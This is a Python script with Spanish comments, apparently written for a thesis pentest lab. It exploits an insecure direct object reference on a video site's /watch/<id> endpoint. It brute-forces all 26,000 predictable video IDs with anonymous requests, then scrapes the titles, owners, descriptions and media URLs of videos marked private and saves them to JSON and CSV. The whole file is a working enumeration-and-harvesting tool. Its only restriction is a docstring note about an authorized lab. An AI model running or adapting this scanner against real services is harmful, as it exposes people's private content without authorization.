#!/usr/bin/env python3
"""
Escáner de IDOR en el endpoint /watch/<id> de StreamWave (BigShop / TFM).

Contexto (ver Hallazgos/F-0XX - IDOR en StreamWave):
  - El ID de vídeo sigue un patrón corto y predecible: "xy" + 1 letra (a-z)
    + 3 dígitos (000-999) -> solo 26.000 combinaciones posibles.
  - /watch/<id> no comprueba en ningún momento si el visitante está
    autenticado ni si es el propietario del vídeo: un vídeo marcado como
    "Private (only people with the link)" se sirve igual que uno público
    a una petición completamente anónima (sin cookie de sesión).
  - Al no haber control de autorización server-side, el único "secreto"
    es el ID en sí -> es trivialmente fuerza-bruteable.

Qué hace este script:
  Fase 1 (barrido rápido): lanza peticiones HEAD anónimas contra todo el
    espacio de IDs para averiguar cuáles existen (200) y cuáles no (404),
    sin descargar el HTML completo de cada una (rápido y ligero).
  Fase 2 (clasificación): para cada ID existente, hace un GET anónimo y
    extrae título y visibilidad (Public / Private) del HTML.

Uso:
    python3 streamwave_idor_watch_scan.py
    python3 streamwave_idor_watch_scan.py --base-url http://172.17.0.2:9090 --threads 40
    python3 streamwave_idor_watch_scan.py --letters abc --numbers 0-50   # barrido reducido de prueba

Solo para uso en el laboratorio controlado BigShop (TFM), con autorización.
No usar contra sistemas sin autorización explícita.
"""

import argparse
import concurrent.futures
import csv
import json
import re
import sys
import threading
import time
import urllib.error
import urllib.request

DEFAULT_BASE_URL = "http://172.17.0.2:9090"
DEFAULT_PREFIX = "xy"
TIMEOUT = 5

TITLE_RE = re.compile(r"<title>(.*?)</title>", re.S)
# Primera línea "N views · Categoria[ · Private]" que sigue al <h1> del vídeo
# (las tarjetas de la barra lateral "Up next" usan otra clase CSS, así que
# este patrón no las confunde).
META_LINE_RE = re.compile(
    r'<p class="text-sm font-semibold mb-1">(.*?)</p>', re.S
)
DESC_RE = re.compile(
    r'<p class="text-sm text-slate-300[^"]*">(.*?)</p>', re.S
)
OWNER_RE = re.compile(r'>@([\w.-]+)</span>', re.S)
MEDIA_SRC_RE = re.compile(r'<video[^>]*\ssrc="([^"]+)"', re.S)

print_lock = threading.Lock()


def build_ids(prefix: str, letters: str, numbers_range: str):
    lo, hi = (int(x) for x in numbers_range.split("-"))
    for letter in letters:
        for n in range(lo, hi + 1):
            yield f"{prefix}{letter}{n:03d}"


RETRIES = 3
RETRY_BACKOFF = 0.4


def head_exists(base_url: str, video_id: str) -> bool:
    req = urllib.request.Request(
        f"{base_url}/watch/{video_id}", method="HEAD"
    )
    last_err = None
    for attempt in range(RETRIES):
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                return resp.status == 200
        except urllib.error.HTTPError as e:
            return e.code == 200
        except Exception as e:
            last_err = e
            time.sleep(RETRY_BACKOFF * (attempt + 1))
    with print_lock:
        print(f"[!] HEAD fallo tras {RETRIES} intentos para {video_id}: {last_err}")
    return False


def classify(base_url: str, video_id: str) -> dict:
    """GET anónimo (sin cookies) y extracción de título/visibilidad, con reintentos."""
    req = urllib.request.Request(f"{base_url}/watch/{video_id}", method="GET")
    last_err = None
    body = None
    status = None
    for attempt in range(RETRIES):
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                status = resp.status
            break
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            status = e.code
            break
        except Exception as e:
            last_err = e
            time.sleep(RETRY_BACKOFF * (attempt + 1))

    if body is None:
        with print_lock:
            print(f"[!] GET fallo tras {RETRIES} intentos para {video_id}: {last_err}")
        return {"id": video_id, "status": None, "visibility": "error", "error": str(last_err)}

    title_m = TITLE_RE.search(body)
    title = title_m.group(1).strip() if title_m else None

    meta_m = META_LINE_RE.search(body)
    meta_line = meta_m.group(1) if meta_m else ""
    is_private = "Private" in meta_line

    desc_m = DESC_RE.search(body)
    description = desc_m.group(1).strip() if desc_m else None

    owner_m = OWNER_RE.search(body)
    owner = owner_m.group(1) if owner_m else None

    media_m = MEDIA_SRC_RE.search(body)
    media_path = media_m.group(1) if media_m else None
    media_url = f"{base_url}{media_path}" if media_path else None

    return {
        "id": video_id,
        "status": status,
        "title": title,
        "owner": owner,
        "description": description,
        "visibility": "private" if is_private else "public",
        "watch_url": f"{base_url}/watch/{video_id}",
        "media_url": media_url,
    }


def scan_existence(base_url: str, ids, threads: int):
    existing = []
    scanned = 0
    total = len(ids)
    lock = threading.Lock()

    def worker(video_id):
        nonlocal scanned
        found = head_exists(base_url, video_id)
        with lock:
            scanned += 1
            if scanned % 2000 == 0:
                print(f"[*] Fase 1/2 (HEAD): {scanned}/{total} IDs probados...")
        return video_id, found

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for video_id, found in ex.map(worker, ids):
            if found:
                existing.append(video_id)

    return existing


def classify_all(base_url: str, ids, threads: int):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for res in ex.map(lambda vid: classify(base_url, vid), ids):
            results.append(res)
            with print_lock:
                vis = res.get("visibility")
                tag = {"private": "[PRIVADO]", "public": "[publico]"}.get(vis, "[ERROR]")
                print(f"{tag} {res['id']}  ->  {res.get('title')}")
                if vis == "private":
                    if res.get("owner"):
                        print(f"           owner: @{res['owner']}")
                    if res.get("description"):
                        print(f"           desc:  {res['description']}")
                    if res.get("media_url"):
                        print(f"           media: {res['media_url']}")
    return results


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base-url", default=DEFAULT_BASE_URL)
    ap.add_argument("--prefix", default=DEFAULT_PREFIX, help="Prefijo fijo del ID (por defecto 'xy')")
    ap.add_argument("--letters", default="abcdefghijklmnopqrstuvwxyz",
                     help="Letras a probar en la 3a posicion del ID (por defecto a-z)")
    ap.add_argument("--numbers", default="0-999", help="Rango numerico 'lo-hi' (por defecto 0-999)")
    ap.add_argument("--threads", type=int, default=15,
                     help="Hilos concurrentes (bajo por defecto: el servidor Node/Express "
                          "local se satura y da falsos negativos con mucha concurrencia)")
    ap.add_argument("--out-json", default="streamwave_idor_results.json")
    ap.add_argument("--out-csv", default="streamwave_idor_private_videos.csv")
    args = ap.parse_args()

    ids = list(build_ids(args.prefix, args.letters, args.numbers))
    print(f"[*] Espacio de IDs a probar: {len(ids)} (prefijo='{args.prefix}', "
          f"letras='{args.letters}', numeros={args.numbers})")
    print(f"[*] Objetivo: {args.base_url}  (peticiones 100% anonimas, sin cookie de sesion)")

    t0 = time.time()
    existing = scan_existence(args.base_url, ids, args.threads)
    print(f"[*] Fase 1 completada en {time.time()-t0:.1f}s. "
          f"IDs existentes encontrados: {len(existing)}/{len(ids)}")

    if not existing:
        print("[!] No se encontro ningun ID existente en el rango probado.")
        sys.exit(0)

    print("[*] Fase 2: clasificando cada video encontrado (GET anonimo)...")
    results = classify_all(args.base_url, existing, args.threads)

    errored = [r for r in results if r.get("visibility") == "error"]
    if errored:
        print(f"[*] Reintentando {len(errored)} IDs con error (secuencial, servidor puede estar saturado)...")
        for r in errored:
            time.sleep(0.3)
            fixed = classify(args.base_url, r["id"])
            r.update(fixed)

    private = [r for r in results if r.get("visibility") == "private"]
    public = [r for r in results if r.get("visibility") == "public"]
    still_errored = [r for r in results if r.get("visibility") == "error"]

    with open(args.out_json, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    with open(args.out_csv, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["id", "watch_url", "title", "owner", "description", "media_url"])
        for r in private:
            w.writerow([r["id"], r["watch_url"], r.get("title"), r.get("owner"),
                        r.get("description"), r.get("media_url")])

    print()
    print("=" * 70)
    print(f"Total de IDs probados:        {len(ids)}")
    print(f"Videos existentes:            {len(results)}")
    print(f"  - Publicos:                 {len(public)}")
    print(f"  - PRIVADOS accedidos (IDOR):{len(private):>5}")
    if still_errored:
        print(f"  - Con error (revisar manualmente): {len(still_errored)}")
    print("=" * 70)
    print(f"[+] Resultados completos  -> {args.out_json}")
    print(f"[+] Solo videos privados  -> {args.out_csv}")
    print(f"Tiempo total: {time.time()-t0:.1f}s")


if __name__ == "__main__":
    main()
